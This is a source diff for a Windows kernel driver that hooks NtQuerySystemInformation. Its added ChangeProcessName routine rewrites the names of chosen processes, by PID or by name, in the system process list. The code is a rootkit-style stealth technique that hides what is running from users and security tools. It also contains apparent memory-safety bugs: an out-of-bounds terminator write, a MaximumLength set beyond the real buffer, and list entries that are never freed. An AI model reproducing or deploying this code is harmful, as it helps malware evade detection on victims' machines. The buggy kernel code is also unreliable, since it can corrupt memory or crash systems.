@@ -7,9 +7,7 @@ NTSTATUS HookNtQuerySystemInformation(
 	OUT OPTIONAL	PULONG                   ReturnLength
 ) {
 	NTSTATUS retStatus;
-
-	//DbgPrint("a\n");
-
+	
 	retStatus = glRealNtQuerySystemInformation(
 		SystemInformationClass,
 		SystemInformation,
@@ -17,14 +15,13 @@ NTSTATUS HookNtQuerySystemInformation(
 		ReturnLength
 	);
 
-	if (SystemInformationClass == SystemProcessInformation && NT_SUCCESS(retStatus)) {
+	if ((SystemInformationClass == SystemProcessInformation) && NT_SUCCESS(retStatus)) {
 
 		__try {
-			DbgPrint("PROCESS ID %d NAME %wZ\n", ((SYSTEM_PROCESS*)SystemInformation)->ProcessId, &((SYSTEM_PROCESS*)SystemInformation)->ProcessName);
-			//FILTER_PROCESS(SYSTEM_PROCESS, SystemInformation, SystemInformationLength, &ReturnLength);
+			ChangeProcessName((PSYSTEM_PROCESS)SystemInformation);
 		}
 		__except (EXCEPTION_EXECUTE_HANDLER) {
-
+			DbgPrint("\n\nEXCEPTION\n\n");
 		}
 
 	}
@@ -33,9 +30,89 @@ NTSTATUS HookNtQuerySystemInformation(
 	return retStatus;
 }
 
-VOID ChangeProcessName() {
+VOID ChangeProcessName(PSYSTEM_PROCESS proc) {
+	PLIST_ENTRY pLink;
+	PSYSTEM_PROCESS pProcess = proc;
+
+	while (TRUE) {
+		if (pProcess->ProcessName.Length) {
+			//DbgPrint("process %wZ %d len:%d %d\n", &pProcess->ProcessName, pProcess->ProcessId, pProcess->ProcessName.Length, pProcess->ProcessName.MaximumLength);
+			for (pLink = glTaskQueueProcess.Flink; pLink != &glTaskQueueProcess; pLink = pLink->Flink) {
+				PTASK_QUEUE_PROCESS task = CONTAINING_RECORD(pLink, TASK_QUEUE_PROCESS, link);
+				if (task->flag & TASK_QUEUE_NUMBER) {
+					if (pProcess->ProcessId == (ULONG)task->target) {
+						ANSI_STRING ansiChange;
+						UNICODE_STRING uniChange;
 
 
+						//DbgPrint("BEFORE %wZ %d len:%d %d\n", &pProcess->ProcessName, pProcess->ProcessId, pProcess->ProcessName.Length, pProcess->ProcessName.MaximumLength);
+
+						RtlInitAnsiString(&ansiChange, (PCSZ)task->change);
+
+						if (!NT_SUCCESS(RtlAnsiStringToUnicodeString(&uniChange, &ansiChange, TRUE))) {
+							break;
+						}
+
+						RtlZeroMemory(pProcess->ProcessName.Buffer, pProcess->ProcessName.MaximumLength);
+
+						if (pProcess->ProcessName.MaximumLength >= uniChange.MaximumLength) {
+							RtlCopyMemory(pProcess->ProcessName.Buffer, uniChange.Buffer, uniChange.MaximumLength);
+							pProcess->ProcessName.Length = uniChange.Length;
+							pProcess->ProcessName.MaximumLength = uniChange.MaximumLength;
+						}
+						else {
+							RtlCopyMemory(pProcess->ProcessName.Buffer, uniChange.Buffer, pProcess->ProcessName.MaximumLength);
+							pProcess->ProcessName.Length = uniChange.Length;
+						}
+
+						//DbgPrint("AFTER %wZ %d len:%d %d\n", &pProcess->ProcessName, pProcess->ProcessId, pProcess->ProcessName.Length, pProcess->ProcessName.MaximumLength);
+
+						RtlFreeUnicodeString(&uniChange);
+					}
+				}
+				else if (task->flag & TASK_QUEUE_POINTER) {
+					ANSI_STRING ansiTarget;
+					UNICODE_STRING uniTarget;
+					
+					
+					RtlInitAnsiString(&ansiTarget, (PCSZ)task->target);
+					if (!NT_SUCCESS(RtlAnsiStringToUnicodeString(&uniTarget, &ansiTarget, TRUE))) {
+						break;
+					}
+					
+					if (!wcscmp(pProcess->ProcessName.Buffer, uniTarget.Buffer)) {
+						ANSI_STRING ansiChange;
+						UNICODE_STRING uniChange;
+						//DbgPrint("BEFORE %wZ %d len:%d %d\n", &pProcess->ProcessName, pProcess->ProcessId, pProcess->ProcessName.Length, pProcess->ProcessName.MaximumLength);
+					
+						RtlInitAnsiString(&ansiChange, (PCSZ)task->change);
+						if (!NT_SUCCESS(RtlAnsiStringToUnicodeString(&uniChange, &ansiChange, TRUE))) {
+							break;
+						}
+						RtlZeroMemory(pProcess->ProcessName.Buffer, pProcess->ProcessName.MaximumLength);
+					
+						if (pProcess->ProcessName.MaximumLength >= uniChange.MaximumLength) {
+							RtlCopyMemory(pProcess->ProcessName.Buffer, uniChange.Buffer, uniChange.MaximumLength);
+							pProcess->ProcessName.Length = uniChange.Length;
+							pProcess->ProcessName.MaximumLength = uniChange.MaximumLength;
+						}
+						else {
+							RtlCopyMemory(pProcess->ProcessName.Buffer, uniChange.Buffer, pProcess->ProcessName.MaximumLength);
+							pProcess->ProcessName.Length = uniChange.Length;
+						}
+						//DbgPrint("AFTER %wZ %d len:%d %d\n", &pProcess->ProcessName, pProcess->ProcessId, pProcess->ProcessName.Length, pProcess->ProcessName.MaximumLength);
+					
+						RtlFreeUnicodeString(&uniChange);
+					}
+					
+					RtlFreeUnicodeString(&uniTarget);
+				}
+			}
+		}
+		if (pProcess->NextEntryDelta) {
+			pProcess = (PSYSTEM_PROCESS)((PUCHAR)pProcess + pProcess->NextEntryDelta);
+		} else break;
+	}
 }
 
 
@@ -45,36 +122,74 @@ ULONG StrLenght(PCHAR str) {
 	return i;
 }
 
-VOID TaskQueueProcess(ULONG pid, PCHAR name) {
+VOID TaskQueueByPID(ULONG pid, PCHAR change) {
 	
-	PTASK_QUEUE task = (PTASK_QUEUE)ExAllocateFromPagedLookasideList(&glPagedTaskQueue);
+	PTASK_QUEUE_PROCESS task = (PTASK_QUEUE_PROCESS)ExAllocateFromPagedLookasideList(&glPagedTaskQueueProcess);
 
-	if (pid != 0) {
-		task->pid = pid;
-		task->name = NULL;
-	}
-	else if (name != NULL) {
-		ULONG len = StrLenght(name);
-		task->name = (PCHAR)ExAllocatePoolWithTag(PagedPool, len, 'oneN');
-		RtlCopyMemory(task->name, name, len);
-		task->pid = 0;
+	if (pid != 0 && change != NULL) {
+		ULONG len = StrLenght(change);
+		task->change = ExAllocatePoolWithTag(PagedPool, len, 'enoN');
+		RtlCopyMemory(task->change, change, len);
+
+		task->target = (PVOID)pid;
+
+		task->flag = TASK_QUEUE_NUMBER;
 	}
 	else {
-		ExFreeToPagedLookasideList(&glPagedTaskQueue, task);
+		ExFreeToPagedLookasideList(&glPagedTaskQueueProcess, task);
 		return;
 	}
 
-	task->done = 0;
-	InsertTailList(&glTaskQueue, &task->link);
+	InsertTailList(&glTaskQueueProcess, &task->link);
 }
 
-VOID FreeListQueue() {
+VOID TaskQueueByName(PCHAR name, PCHAR change) {
 
-	while (!IsListEmpty(&glTaskQueue)) {
-		PLIST_ENTRY pLink = RemoveHeadList(&glTaskQueue);
-		PTASK_QUEUE task = CONTAINING_RECORD(pLink, TASK_QUEUE, link);
-		if (task->name) ExFreePool(&task->name);
-		ExFreeToPagedLookasideList(&glPagedTaskQueue, task);
+	PTASK_QUEUE_PROCESS task = (PTASK_QUEUE_PROCESS)ExAllocateFromPagedLookasideList(&glPagedTaskQueueProcess);
+
+	if (name != NULL && change != NULL) {
+		ULONG len = StrLenght(name);
+		task->target = ExAllocatePoolWithTag(PagedPool, len, 'oneN');
+		RtlCopyMemory(task->target, name, len);
+		((PCHAR)task->target)[len] = '\0';
+
+		len = StrLenght(change);
+		task->change = ExAllocatePoolWithTag(PagedPool, len, 'enoN');
+		RtlCopyMemory(task->change, change, len);
+		//((PCHAR)task->change)[len] = '\0';
+
+		task->flag = TASK_QUEUE_POINTER;
+	}
+	else {
+		ExFreeToPagedLookasideList(&glPagedTaskQueueProcess, task);
+		return;
 	}
 
+	InsertTailList(&glTaskQueueProcess, &task->link);
+}
+
+VOID FreeListQueueProcess() {
+
+	while (!IsListEmpty(&glTaskQueueProcess)) {
+		PLIST_ENTRY pLink = RemoveHeadList(&glTaskQueueProcess);
+		PTASK_QUEUE_PROCESS task = CONTAINING_RECORD(pLink, TASK_QUEUE_PROCESS, link);
+		if (task->target && (task->flag & TASK_QUEUE_POINTER)) ExFreePool(task->target);
+		if (task->change) ExFreePool(task->change);
+		//ExFreeToPagedLookasideList(&glPagedTaskQueue, task);
+	}
+
+}
+
+VOID PrintTaskQueueProcessList() {
+	PLIST_ENTRY pLink;
+	for (pLink = glTaskQueueProcess.Flink; pLink != &glTaskQueueProcess; pLink = pLink->Flink) {
+		PTASK_QUEUE_PROCESS task = CONTAINING_RECORD(pLink, TASK_QUEUE_PROCESS, link);
+
+		if (task->flag & TASK_QUEUE_POINTER) {
+			DbgPrint("TASK NAME:%s\t->\tCHANGE:%s\n", (PCHAR)task->target, (PCHAR)task->change);
+		}
+		else if (task->flag & TASK_QUEUE_NUMBER) {
+			DbgPrint("TASK PID:%d\t->\tCHANGE:%s\n", (ULONG)task->target, (PCHAR)task->change);
+		}
+	}
 }
